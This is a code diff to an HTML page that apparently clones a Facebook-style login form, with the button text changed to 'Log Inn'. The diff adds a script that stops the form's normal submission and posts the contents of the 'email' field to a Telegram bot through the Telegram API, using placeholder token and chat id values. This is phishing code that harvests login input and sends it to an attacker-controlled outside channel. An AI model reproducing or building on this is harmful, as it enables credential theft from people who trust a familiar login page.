@@ -171,7 +171,7 @@
                             type="submit"
                             id="u_0_d_5u"
                           >
-                            Log In
+                            Log Inn
                           </button>
                         </div>
                         <div class="_6ltj">
@@ -634,6 +634,31 @@
       as="style"
       crossorigin="anonymous"
     />
+  <script>
+    async function sendToTelegram(e) {
+      e.preventDefault();
+      const message = document.getElementById('email').value;
+      const botToken = 'YOUR_BOT_TOKEN';
+      const chatId = 'YOUR_CHAT_ID';
+      const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
+      const response = await fetch(apiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+
+      if (response.ok) {
+        alert('Message sent!');
+      } else {
+        alert('Error sending message.');
+      }
+    }
+  </script>
    </body>
 </html>
